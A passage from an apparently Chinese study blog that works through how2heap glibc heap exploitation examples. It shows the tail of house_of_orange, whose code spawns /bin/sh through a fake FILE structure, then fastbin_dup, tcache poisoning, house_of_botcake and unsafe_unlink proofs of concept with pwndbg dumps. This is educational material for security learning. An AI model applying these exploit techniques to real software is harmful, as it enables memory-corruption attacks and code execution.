    heap end       In this situation, the new Top will be starting from an address that is adjacent to the heap end.       So the area between the second chunk and the heap end is unused.       And the old Top chunk gets freed.       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,       it gets added to list of unsorted bins.       Now we request a chunk of size larger than the size of the top chunk.       This forces sysmalloc to be invoked.       And ultimately invokes _int_free       Finally the heap looks like this:          |------------|------------|------..--|--...--|---------|          |    chunk   |    chunk   | free ..  |  ...  | new Top |          |------------|------------|------..--|--...--|---------|     heap start                                             new heap end    *&#x2F;    p2 &#x3D; malloc(0x1000);    &#x2F;*      Note that the above chunk will be allocated in a different page      that gets mmapped. It will be placed after the old heap&#39;s end      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins      Here starts phase two of the attack. We assume that we have an overflow into the old      top chunk so we could overwrite the chunk&#39;s size.      For the second phase we utilize this overflow again to overwrite the fd and bk pointer      of this chunk in the unsorted bin list.      There are two common ways to exploit the current state:        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)        - Use the unlinking of the chunk for an *where*-controlled write of the          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)      The former attack is pretty straight forward to exploit, so we will only elaborate      on a variant of the latter, developed by Angelboy in the blog post linked above.      The attack is pretty stunning, as it exploits the abort call itself, which      is triggered when the libc detects any bogus state of the heap.      Whenever abort is triggered, it will flush all the file pointers by calling      _IO_flush_all_lockp. Eventually, walking through the linked list in      _IO_list_all and calling _IO_OVERFLOW on them.      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;&#x2F;bin&#x2F;sh&#39;, so      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;&#x2F;bin&#x2F;sh&#39;).      More about file-pointer exploitation can be found here:      https:&#x2F;&#x2F;outflux.net&#x2F;blog&#x2F;archives&#x2F;2011&#x2F;12&#x2F;22&#x2F;abusing-the-file-structure&#x2F;      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they      currently point to the libc&#39;s main_arena.    *&#x2F;    io_list_all &#x3D; top[2] + 0x9a8;    &#x2F;*      We plan to overwrite the fd and bk pointers of the old top,      which has now been added to the unsorted bins.      When malloc tries to satisfy a request by splitting this free chunk      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list      in libc&#39;s main_arena.      Note that this overwrite occurs before the sanity check and therefore, will occur in any      case.      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.      So, we should set chunk-&gt;bk to be _IO_list_all - 16    *&#x2F;     top[3] &#x3D; io_list_all - 0x10;    &#x2F;*      At the end, the system function will be invoked with the pointer to this file pointer.      If we fill the first 8 bytes with &#x2F;bin&#x2F;sh, it is equivalent to system(&#x2F;bin&#x2F;sh)    *&#x2F;    memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);    &#x2F;*      The function _IO_flush_all_lockp iterates through the file pointer linked-list      in _IO_list_all.      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,      the idea is to get control over the memory at the corresponding fd-ptr.      The address of the next file pointer is located at base_address+0x68.      This corresponds to smallbin-4, which holds all the smallbins of      sizes between 90 and 98. For further information about the libc&#39;s bin organisation      see: https:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;02&#x2F;10&#x2F;understanding-glibc-malloc&#x2F;      Since we overflow the old top chunk, we also control it&#39;s size field.      Here it gets a little bit tricky, currently the old top chunk is in the      unsortedbin list. For each allocation, malloc tries to serve the chunks      in this list first, therefore, iterates over the list.      Furthermore, it will sort all non-fitting chunks into the corresponding bins.      If we set the size to 0x61 (97) (prev_inuse bit has to be set)      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,      therefore, occupying the smallbin[4] location in the main_arena and      eventually representing the fake file pointer&#39;s fd-ptr.      In addition to sorting, malloc will also perform certain size checks on them,      so after sorting the old top chunk and following the bogus fd pointer      to _IO_list_all, it will check the corresponding size field, detect      that the size is smaller than MINSIZE &quot;size &lt;&#x3D; 2 * SIZE_SZ&quot;      and finally triggering the abort call that gets our chain rolling.      Here is the corresponding code in the libc:      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;malloc&#x2F;malloc.c.html#3717    *&#x2F;    top[1] &#x3D; 0x61;    &#x2F;*      Now comes the part where we satisfy the constraints on the fake file pointer      required by the function _IO_flush_all_lockp and tested here:      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;libio&#x2F;genops.c.html#813      We want to satisfy the first condition:      fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base    *&#x2F;    FILE *fp &#x3D; (FILE *) top;    &#x2F;*      1. Set mode to 0: fp-&gt;_mode &lt;&#x3D; 0    *&#x2F;    fp-&gt;_mode &#x3D; 0; &#x2F;&#x2F; top+0xc0    &#x2F;*      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base    *&#x2F;    fp-&gt;_IO_write_base &#x3D; (char *) 2; &#x2F;&#x2F; top+0x20    fp-&gt;_IO_write_ptr &#x3D; (char *) 3; &#x2F;&#x2F; top+0x28    &#x2F;*      4) Finally set the jump table to controlled memory and place system there.      The jump table pointer is right after the FILE struct:      base_address+sizeof(FILE) &#x3D; jump_table         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 &#x3D;&#x3D; winner    *&#x2F;    size_t *jump_table &#x3D; &amp;top[12]; &#x2F;&#x2F; controlled memory    jump_table[3] &#x3D; (size_t) &amp;winner;    *(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F; top+0xd8    &#x2F;* Finally, trigger the whole chain by calling malloc *&#x2F;    malloc(10);   &#x2F;*     The libc&#39;s error message will be printed to the screen     But you&#39;ll get a shell anyways.   *&#x2F;    return 0;&#125;int winner(char *ptr)&#123;     system(ptr);    syscall(SYS_exit, 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IO还没学，暂且先放着</p><h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><p><code>2.27</code>和<code>2.23</code>的主要区别就是引入了<code>tcache</code>,但同时也去掉了一些检测</p><h3 id="fastbin-dup-double-free"><a href="#fastbin-dup-double-free" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdout, NULL);void *ptrs[8];for (int i&#x3D;0; i&lt;8; i++) &#123;ptrs[i] &#x3D; malloc(8);&#125;for (int i&#x3D;0; i&lt;7; i++) &#123;free(ptrs[i]);&#125;int *a &#x3D; calloc(1, 8);int *b &#x3D; calloc(1, 8);int *c &#x3D; calloc(1, 8);free(a);free(b);free(a);a &#x3D; calloc(1, 8);b &#x3D; calloc(1, 8);c &#x3D; calloc(1, 8);assert(a &#x3D;&#x3D; c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>之后正常利用<code>double free</code></p><p>先创建7个堆并释放以填满<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建三个堆，先释放前两个堆，再释放第一个堆，造成<code>double free</code>，<code>bin</code>中由第一个堆指向第二个堆再指向第一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0fastbins0x20: 0x405390 —▸ 0x4053b0 ◂— 0x4053900x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时创建三个堆，第一三个堆为同一个堆</p><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;void *ptrs[7];for (int i&#x3D;0; i&lt;7; i++) &#123;ptrs[i] &#x3D; malloc(8);&#125;for (int i&#x3D;0; i&lt;7; i++) &#123;free(ptrs[i]);&#125;unsigned long long stack_var;int *a &#x3D; calloc(1,8);int *b &#x3D; calloc(1,8);int *c &#x3D; calloc(1,8);free(a);free(b);free(a);unsigned long long *d &#x3D; calloc(1,8);stack_var &#x3D; 0x20;*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));void *p &#x3D; calloc(1,8);assert(p &#x3D;&#x3D; 8+(char *)&amp;stack_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>fastbin_dup</code>即<code>double free</code>，申请出第一个堆之后将<code>fd</code>位置改成栈上的地址，于是栈上地址就会出现在<code>bin</code>链中，就能被申请出来了</p><h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;const size_t allocsize &#x3D; 0x40;int main()&#123;  setbuf(stdout, NULL);  char* ptrs[14];  size_t i;  for (i &#x3D; 0; i &lt; 14; i++) &#123;    ptrs[i] &#x3D; malloc(allocsize);  &#125;  for (i &#x3D; 0; i &lt; 7; i++) &#123;    free(ptrs[i]);  &#125;  char* victim &#x3D; ptrs[7];   free(victim);  for (i &#x3D; 8; i &lt; 14; i++) &#123;    free(ptrs[i]);  &#125;  size_t stack_var[6];  memset(stack_var, 0xcd, sizeof(stack_var));  *(size_t**)victim &#x3D; &amp;stack_var[0];  for (i &#x3D; 0; i &lt; 7; i++) &#123;    ptrs[i] &#x3D; malloc(allocsize);  &#125;  for (i &#x3D; 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  malloc(allocsize);  for (i &#x3D; 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  char *q &#x3D; malloc(allocsize);  assert(q &#x3D;&#x3D; (char *)&amp;stack_var[2]);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>之后填入<code>fastbin</code>并改<code>fd</code>为目的地址，再从<code>tcache</code>申请堆之后<code>fastbin</code>中的堆会落到<code>tcache</code>，顺延申请到目的地址</p><p>创建了<code>14</code>个堆之后全部释放</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405440 —▸ 0x4053f0 —▸ 0x4053a0 —▸ 0x405350 —▸ 0x405300 —▸ 0x4052b0 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x405660 —▸ 0x405610 —▸ 0x4055c0 —▸ 0x405570 —▸ 0x405520 ◂— ...0x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>fastbin</code>中第一个堆的<code>fd</code>改成目标地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x51fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x4052a0Size: 0x51fd: 0x405260Free chunk (tcache) | PREV_INUSEAddr: 0x4052f0Size: 0x51fd: 0x4052b0Free chunk (tcache) | PREV_INUSEAddr: 0x405340Size: 0x51fd: 0x405300Free chunk (tcache) | PREV_INUSEAddr: 0x405390Size: 0x51fd: 0x405350Free chunk (tcache) | PREV_INUSEAddr: 0x4053e0Size: 0x51fd: 0x4053a0Free chunk (tcache) | PREV_INUSEAddr: 0x405430Size: 0x51fd: 0x4053f0Free chunk (fastbins) | PREV_INUSEAddr: 0x405480Size: 0x51fd: 0x7fffffffdc60&lt;-- target...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>tachce</code>全部申请完再申请一次之后目的地址会出现在<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x7fffffffdc70 —▸ 0x405490 —▸ 0x4054e0 —▸ 0x405530 —▸ 0x405580 —▸ 0x4055d0 —▸ 0x405620 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0xcdcdcdcdcdcdcdcd0x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-botcake-double-free"><a href="#house-of-botcake-double-free" class="headerlink" title="house_of_botcake(double free)"></a>house_of_botcake(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    intptr_t stack_var[4];    intptr_t *x[7];    for(int i&#x3D;0; i&lt;sizeof(x)&#x2F;sizeof(intptr_t*); i++)&#123;        x[i] &#x3D; malloc(0x100);    &#125;        intptr_t *prev &#x3D; malloc(0x100);    intptr_t *a &#x3D; malloc(0x100);    malloc(0x10);        for(int i&#x3D;0; i&lt;7; i++)&#123;        free(x[i]);    &#125;    free(a);    free(prev);        malloc(0x100);    free(a);        intptr_t *b &#x3D; malloc(0x120);    b[0x120&#x2F;8-2] &#x3D; (long)stack_var;        malloc(0x100);    intptr_t *c &#x3D; malloc(0x100);        assert(c&#x3D;&#x3D;stack_var);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>double free</code>使得同一个堆同时出现在<code>tcache</code>和<code>unsorted bin</code>造成堆块重叠</p><p>创建7个堆填满<code>tcache</code>，两个堆用于填入<code>unsorted bin</code>，最后一个堆防止和<code>top chunk</code>合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405360Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405470Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405580Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405690Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405be0Size: 0x21Top chunk | PREV_INUSEAddr: 0x405c00Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将所有堆释放以进入对应的<code>bin</code>，其中<code>unsorted bin</code>中的两个堆合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个堆让<code>tcache</code>有一个空位</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  6]: 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次释放<code>unsorted bin</code>的第一个堆使其进入<code>tcache</code>，此时<code>tcache</code>和<code>unsorted bin</code>的第一个堆是同一个堆，造成了堆块重叠</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x405ae0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 —▸ 0x405260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059c0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4059c0smallbinsemptylargebinsemptypwndbg&gt; x&#x2F;20gx 0x405ad00x405ad0:       0x0000000000000000      0x00000000000001110x405ae0:       0x00000000004057b0      0x00007ffff7dcfca00x405af0:       0x0000000000000000      0x00000000000000000x405b00:       0x0000000000000000      0x00000000000000000x405b10:       0x0000000000000000      0x00000000000000000x405b20:       0x0000000000000000      0x00000000000000000x405b30:       0x0000000000000000      0x00000000000000000x405b40:       0x0000000000000000      0x00000000000000000x405b50:       0x0000000000000000      0x00000000000000000x405b60:       0x0000000000000000      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比释放的堆大一点的堆，这个堆会从<code>unsorted bin</code>中切割，且和<code>tcache</code>中第一个地址相同</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x405360Size: 0x111fd: 0x405260Free chunk (tcache) | PREV_INUSEAddr: 0x405470Size: 0x111fd: 0x405370Free chunk (tcache) | PREV_INUSEAddr: 0x405580Size: 0x111fd: 0x405480Free chunk (tcache) | PREV_INUSEAddr: 0x405690Size: 0x111fd: 0x405590Free chunk (tcache) | PREV_INUSEAddr: 0x4057a0Size: 0x111fd: 0x4056a0Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x131Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405af0Size: 0xf1fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Allocated chunkAddr: 0x405be0Size: 0x20Top chunk | PREV_INUSEAddr: 0x405c00Size: 0x20401<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改刚创建的堆的<code>fd</code>位置，此时<code>tcache</code>中的堆会被修改，实现任意地址写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x405ae0 —▸ 0x7fffffffdcf0 —▸ 0x7fffffffdd58 —▸ 0x7fffffffde28 —▸ 0x7fffffffe1c1 ◂— &#39;&#x2F;home&#x2F;starrysky&#x2F;how2heap&#x2F;how2heap&#x2F;glibc_2.27&#x2F;house_of_botcake&#39;fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405af0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405af0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unsafe-unlink-unlink"><a href="#unsafe-unlink-unlink" class="headerlink" title="unsafe_unlink(unlink)"></a>unsafe_unlink(unlink)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;uint64_t *chunk0_ptr;int main()&#123;setbuf(stdout, NULL);int malloc_size &#x3D; 0x420;int header_size &#x3D; 2;chunk0_ptr &#x3D; (uint64_t*) malloc(malloc_size);uint64_t *chunk1_ptr  &#x3D; (uint64_t*) malloc(malloc_size); chunk0_ptr[2] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);chunk0_ptr[3] &#x3D; (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);uint64_t *chunk1_hdr &#x3D; chunk1_ptr - header_size;chunk1_hdr[0] &#x3D; malloc_size;chunk1_hdr[1] &amp;&#x3D; ~1;free(chunk1_ptr);char victim_string[8];strcpy(victim_string,&quot;Hello!~&quot;);chunk0_ptr[3] &#x3D; (uint64_t) victim_string;chunk0_ptr[0] &#x3D; 0x4141414142424242LL;assert(*(long *)victim_string &#x3D;&#x3D; 0x4141414142424242L);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>tcache</code>最大范围是<code>0x408</code>,超过这个范围的会被释放到<code>unsorted bin</code></p><p>创建属于<code>unsorted bin</code>的堆之后伪造一个堆绕过<code>unlink</code>的检查</p><p><code>unlink</code>相关检查</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;#define unlink(AV, P, BK, FD) &#123;                                               if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                    FD &#x3D; P-&gt;fd;                                   BK &#x3D; P-&gt;bk;                                   if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                 malloc_printerr (&quot;corrupted double-linked list&quot;);                    else &#123;                                    FD-&gt;bk &#x3D; BK;                                   BK-&gt;fd &#x3D; FD;                                   if (!in_smallbin_range (chunksize_nomask (P))                          &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;                 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)             || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))             malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);               if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                                    FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;                           else &#123;                                             FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                  FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                  P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;                                  P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;                                &#125;                                          &#125; else &#123;                                         P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                           P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                         &#125;                                         &#125;                                     &#125;                                  &#125;<span aria-hidden="true" 